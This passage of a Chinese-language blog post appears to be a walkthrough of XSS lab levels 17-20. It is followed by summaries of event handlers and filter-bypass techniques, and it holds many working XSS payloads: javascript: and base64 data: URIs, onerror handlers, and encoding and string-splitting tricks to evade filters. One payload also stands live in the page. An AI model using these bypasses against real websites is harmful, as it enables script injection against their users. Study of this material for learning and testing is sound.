+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed src=&quot;index.png&quot; =onclick=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果是arg1传的话</p>
+<p>html标签解析为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed src=index.png&gt;onclick=alert(1)=test</span><br></pre></td></tr></table></figure>
+
+<p>浏览器解析为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed src=&quot;index.png&quot; onclick=&quot;alert(1)=test&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>一个能解析，一个不能的原因是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一种等号在修正错误中被当作了属性名，后面的就被当作了属性值来触发</span><br><span class="line">第二种onclick被当作属性名，后面的被当作属性值，格式错误不会被执行</span><br></pre></td></tr></table></figure>
+
+<h1 id="level18（emebd标签）"><a href="#level18（emebd标签）" class="headerlink" title="level18（emebd标签）"></a>level18（emebd标签）</h1><p>与上一关无区别</p>
+<h1 id="level19（emebd标签）"><a href="#level19（emebd标签）" class="headerlink" title="level19（emebd标签）"></a>level19（emebd标签）</h1><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211727982.png" alt="image-20250521172706893"></p>
+<p>虽然答题与上面基本相同，但是这里的双引号闭合加上html实体化编码就让我们不能够闭合</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert()&quot;&gt;here&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>至于为什么arg01要传version，跟swf反编译有关了</p>
+<h1 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h1><p>依旧反编译</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=id&amp;arg02=xss\&quot;))&#125;catch(e)&#123;alert(1)&#125;//%26width=123%26height=123</span><br></pre></td></tr></table></figure>
+
+<p>之后再去深究一下。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>注意过滤测试以及如何绕过，对于引号大小于符号的闭合，各种事件的使用以及条件的注意，href的隐藏属性自动解析HTML实体化编码（ascii转unicode）的利用，对type&#x3D;”hidden”的覆盖，http请求头的传值（refere，cookie，user-agent等），隐藏GETPOST的参数值的利用，图片属性插入xss代码，ng-include文件包涵可以无视html实体化，flash xss了解即可（flash插件的淘汰）</p>
+<h1 id="事件总结"><a href="#事件总结" class="headerlink" title="事件总结"></a>事件总结</h1><p>1.配合javascript伪协议</p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211810795.png" alt="image-20250521181028732"></p>
+<p>2.<img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211812564.png" alt="image-20250521181208522"></p>
+<ol start="3">
+<li></li>
+</ol>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211812784.png" alt="image-20250521181236746"></p>
+<ol start="4">
+<li></li>
+</ol>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211812625.png" alt="image-20250521181256588"></p>
+<ol start="5">
+<li></li>
+</ol>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211813307.png" alt="image-20250521181348264"></p>
+<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211814370.png" alt="image-20250521181400315"></p>
+<h1 id="绕过总结"><a href="#绕过总结" class="headerlink" title="绕过总结"></a>绕过总结</h1><h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><p>&#x2F;代替空格</p>
+<p>回车代替空格，再进行url编码即%0a</p>
+<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><h3 id="Unicode编码绕过"><a href="#Unicode编码绕过" class="headerlink" title="Unicode编码绕过"></a>Unicode编码绕过</h3><p>浏览器会自动将 HTML 实体编码（如 <code>a</code>）和 Unicode 转义序列（如 <code>\u0061</code>）解码为原始字符，然后再执行 JavaScript。</p>
+<h3 id="url编码绕过（注入点存在href，src属性）"><a href="#url编码绕过（注入点存在href，src属性）" class="headerlink" title="url编码绕过（注入点存在href，src属性）"></a>url编码绕过（注入点存在href，src属性）</h3><p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p>url编码（不能对协议进行任何的编码操作）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;iframe src=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ASCII-Hex-八进制绕过"><a href="#ASCII-Hex-八进制绕过" class="headerlink" title="ASCII&#x2F;Hex&#x2F;八进制绕过"></a><strong>ASCII&#x2F;Hex&#x2F;八进制绕过</strong></h3><p>浏览器会先将这些编码进行解码，再执行js</p>
+<h3 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h3><p>base64编码通常需要使用到data伪协议（允许直接在url中间插入数据，允许浏览器直接解析base64编码的js代码）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.&lt;object&gt; 标签</span><br><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;</span><br><span class="line">2.&lt;a&gt; 标签</span><br><span class="line">&lt;a href=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;test&lt;/a&gt;   （新版浏览器不支持）</span><br><span class="line">3.&lt;iframe&gt; 标签</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">4.&lt;embed&gt; 标签</span><br><span class="line">&lt;embed src=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/embed&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="圆括号过滤的绕过"><a href="#圆括号过滤的绕过" class="headerlink" title="圆括号过滤的绕过"></a>圆括号过滤的绕过</h3><p>反引号的替换</p>
+<script>alert`1`</script>
+
+<p>data协议绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiWHNzVGVzdCIpOzwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="单引号绕过"><a href="#单引号绕过" class="headerlink" title="单引号绕过"></a>单引号绕过</h3><p>斜杠的替换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/1/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>反引号的替换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(`1`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="alert-过滤的绕过"><a href="#alert-过滤的绕过" class="headerlink" title="alert()过滤的绕过"></a>alert()过滤的绕过</h3><p>prompt替换（<code>prompt()</code> 是 JavaScript 的一个方法，它会显示一个带有输入框的对话框）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;prompt(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>confirm替换（<code>confirm()</code> 显示一个带有确定&#x2F;取消按钮的对话框）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;confirm(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>console.log替换（<code>console.log()</code> 将内容输出到浏览器控制台，不会在页面上显示任何内容，只在开发者工具的控制台中可见）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;console.log(3)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>document.write 替换（<code>document.write()</code> 直接将内容写入 HTML 文档）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.write(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="函数拼接"><a href="#函数拼接" class="headerlink" title="函数拼接"></a>函数拼接</h3><p> eval</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;al&#x27;+&#x27;ert(1)&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p> top</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>window</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>self</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;self[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p> parent</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;parent[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>frames</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;frames[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+        </div>
+        
+            <div class="post-container">
+                <aside class="toc-container">
+                    <button class="toc-toggle">文章目录</button>
+                    <nav class="toc" id="toc"></nav>
+                </aside>
+            </div>
+        
+    </div>
+    
+    <!-- 评论系统 -->
+    
+
+    <!-- 返回主页链接 -->
+    <div class="text-center my-8">
+        <a href="/" class="text-hacker-color1 underline hover:text-hacker-color2">← Back to Home</a>
+    </div>
+
+    <script src="/js/toc.js"></script>  <!-- 引入 TOC 逻辑 -->
+    <footer class="bg-black text-gray-400 py-4">
+    <div class="container mx-auto text-center">
+      <p>© <span id="current-year"></span>  ycycyc 
+        <br> Powered by <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://github.com/m310ct/hexo-theme-hexploit">Hexpolit</a></p>
+    </div>
+  </footer>
+  
+  <script> 
+    document.getElementById("current-year").textContent = new Date().getFullYear();
+  </script>
+  
+
+</body>
+</html>
